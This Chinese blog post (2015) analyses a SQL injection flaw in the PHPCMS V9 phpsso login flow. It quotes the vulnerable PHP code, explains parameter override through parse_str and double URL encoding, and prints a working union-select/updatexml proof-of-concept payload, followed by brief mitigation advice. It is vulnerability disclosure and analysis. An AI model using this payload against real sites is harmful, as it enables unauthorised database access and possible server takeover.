---
layout: post
title: "PHPCMS用户登陆SQL注入漏洞分析"
date: 2015-07-21 11:26:23 +0800
comments: true
categories: 技术
tags: [phpcms,sql注入] 
---

## 0x00 简述

之前manning在调漏洞的时候，突然发现正常登陆不上去了，当时帮忙跟了下phpcms的登陆流程。之后感觉这个流程貌似有些问题，就仔细看了下，没想到真是一个0day~~

## 0x01 漏洞原理

我们先直接看这个漏洞最根源的地方，phpsso/index.php文件所有的操作都存在严重的注入问题，这个类文件的构造函数最先调用它的父构造函数，通过auth_key来解析POST传入的data内容，解析后data中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。这个问题其实在XXX的《PHPCMS V9 最新版本配置文件未授权访问读取》中已经体现出来了，不过他仅仅只是分析了信息泄露的问题，而忽略的他利用所使用的注入问题。

<!-- more -->

我们以phpsso的login流程为例来看这个问题，先看phpsso的解析数据部分的代码：

```php
		if(isset($_POST['appid'])) {
			$this->appid = intval($_POST['appid']);
		} else {
			exit('0');
		}


		if(isset($_POST['data'])) {
			parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);
			if(empty($this->data) || !is_array($this->data)) {
				exit('0');
```

在auth_key解码之后使用parse_str解析成数组格式，这段代码如果在php5.3之前的情况下是没有问题的，因为默认情况下parse_str会启动gpc机制对特殊字符进行转义。但是在php5.3之后gpc机制默认就关闭掉了，这就导致如果解析出来的内容如果带有单引号这类个特殊字符，就原封不动的放到的变量中，这导致了注入的风险。下面我们简单来看一下login行为的代码：

```php
	public function login() {
		$this->password = isset($this->data['password']) ? $this->data['password'] : '';
		$this->email = isset($this->data['email']) ? $this->data['email'] : '';
		if($this->email) {
			$userinfo = $this->db->get_one(array('email'=>$this->email));
		} else {
			$userinfo = $this->db->get_one(array('username'=>$this->username));
		}
		
		if ($this->config['ucuse']) {
			pc_base::load_config('uc_config');
			require_once PHPCMS_PATH.'api/uc_client/client.php';
			list($uid, $uc['username'], $uc['password'], $uc['email']) = uc_user_login($this->username, $this->password, 0);
		}
		
		if($userinfo) {
			//ucenter登陆部份
			if ($this->config['ucuse']) {
				if($uid == -1) {	//uc不存在该用户，调用注册接口注册用户
					$uid = uc_user_register($this->username , $this->password, $userinfo['email'], $userinfo['random']);
					if($uid >0) {
						$this->db->update(array('ucuserid'=>$uid), array('username'=>$this->username));
					}
				}
			}
```

所有$this->data的内容没有经过任何处理就直接参数到数据库查询当中，如果我们有auth_key的话，完全可以构造带有恶意的内容提交造成SQL注入漏洞。那么如果没有auth_key怎么办呢？我们可以让使用auth_key的页面帮我们编码，甚至帮助我们提交。因此下面这个看似无关紧要的问题，就成了导致注入必不可少的一步。

说了这么多，终于可以开始入正题了。我们来跟一下登陆的流程，先看member/index.php文件中的login方法:

```php
			$username = isset($_POST['username']) && is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
			$password = isset($_POST['password']) && trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
			$cookietime = intval($_POST['cookietime']);
			$synloginstr = ''; //同步登陆js代码
			
			if(pc_base::load_config('system', 'phpsso')) {
				$this->_init_phpsso();
				$status = $this->client->ps_member_login($username, $password);
				$memberinfo = unserialize($status);
```

通过这段代码我们需要注意到三个地方，首先是username使用的is_username进行了过滤而password没有做任何处理，然后通过client的ps_member_login方法获取一段数据。最需要关注的是最后一个地方，之后所有操作的内容就完全使用的返回的这套数据。

下面我们继续来看ps_member_login这个方法的代码：

```php
public function ps_member_login($username, $password, $isemail=0) {
		if($isemail) {
			if(!$this->_is_email($username)) {
				return -3;
			}
			$return = $this->_ps_send('login', array('email'=>$username, 'password'=>$password));
		} else {
			$return = $this->_ps_send('login', array('username'=>$username, 'password'=>$password));
		}
		return $return;
	}

private function _ps_send($action, $data = null) {
 		return $this->_ps_post($this->ps_api_url."/index.php?m=phpsso&c=index&a=".$action, 500000, $this->auth_data($data));
	}
```

可以看出使用_ps_post这个方法向phpsso机制的请求login行为，也就是说member的认证其实是有phpsso来完成的。而phpsso的认证数据是需要auth_key编码的，那么这个过程就很直接的呈现在我们眼前：登录用户提交用户名和密码给menber的login，然后member的login通过ps_member_login构造发送phpsso请求login验证的http包，并且将用户名和密码使用auth_key进行编码，作为http包的post数据，phpsso认证完成后，将用户的信息返回给member的login进行后续处理。

上面的这个过程中我们需要牢记的一点，就是password没有做任何处理。带着这一点，我们再回头看phpsso的login注入问题点，就可以很明确的发现通过password能够造成注入问题。

我们在这里简单总结下漏洞原因，首先member的login没有对password做过滤便带入到phpsso的login中进行验证，然后phpsso没有对于解码数据进行过滤，从而导致SQL注入。

## 0x02 漏洞利用

password字段如果存在特殊字符，在传入到程序时仍然会被转义，而且在phpsso的login中使用的是username做数据库查询，而不是password。

针对第一个问题我们可以使用二次url编码的方法来搞定，在解码之后程序还是用了parse_str对字符串进行了拆解，而这个函数还附带了解url编码的功能。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。

第二个问题也用到parse_str的功能，parse_str在解析“username=123&password=456”这样的字符串，会把它解析为：

```php
Array(
    username=>123,
    password=>456
)
```

那么如果被解析字符串变成“usernamen=123&password=456&username=789”，他就会被解析为：

```php
Array(
    username=>789,
    password=>456
}
```

那这样我们的利用思路就有了：将”&username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下：

```
usernmae=phpcms&password=%26username%3d%2527
```

## 0x03 进阶利用

按照上一小节的步骤我们可以获得到一个盲注点，但是感觉有些鸡肋。不过当我再回头看member的login流程的最后一步时，想到了一个有趣的进阶利用方法，就是利用注入来构造注入，我个这种方法起名字叫注入接力（和二次注入稍有不同）。

前文我们提到了member的login再从phpsso获取数据后，所有的操作都使用的是这些数据。那么如果我们结合之前的SQL注入，返回一段带有SQL注入语句的数据，不就可以造成再一次的注入吗。

不过这里有一个地方需要注意，就是在/phpsso_server/phpcms/modules/phpsso/index.php的login中结尾会使用uid更新登陆信息，所以为了可以实现在member的login中注入不能把注入语句写到uid中。

```php
		if(!empty($userinfo) && $userinfo['password'] == create_password($this->password, $userinfo['random'])) {
			//登录成功更新用户最近登录时间和ip
			$this->db->update(array('lastdate'=>SYS_TIME, 'lastip'=>ip()), array('uid'=>$userinfo['uid']));
			exit(serialize($userinfo));
		}
```

由于这个问题我们不能在member的login中的第一个getone查询中进行注入，只好退而求其次，在之后的insert中实现注入攻击。

测试poc原文如下：

```
username=phpcms&password=123456&username=' union select '2','test\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\'123456\',\'\',\'\',\'\',\'\',\'\',\'2\',\'10\'),(\'2\',\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null#

```

编码后内容如下：

```

username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523
```

效果如下图所示：

![1](/assets/images/2015-07/2015-07-21-poc.png)

## 0x04 总结

这个漏洞分析中，最大的收获是用到漏洞接力这种利用思路来完成由盲注到可报错注入的华丽转身。

### 漏洞小结

影响范围个人评价为“高”，PHPCMS在国内的使用范围非常广，而且此漏洞影响PHPCMS目前主流的V9版本，虽然收到PHP的版本影响，但是目前大多数的服务都已经开始更换PHP版本，所以影响范围还是很广的。

危害性个人评价为“高”，此漏洞只需要可以访问目标网站便可以实现攻击，获取数据库信息，并有很大的可能getshell。

### 防护方案

针对phpsso模块添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。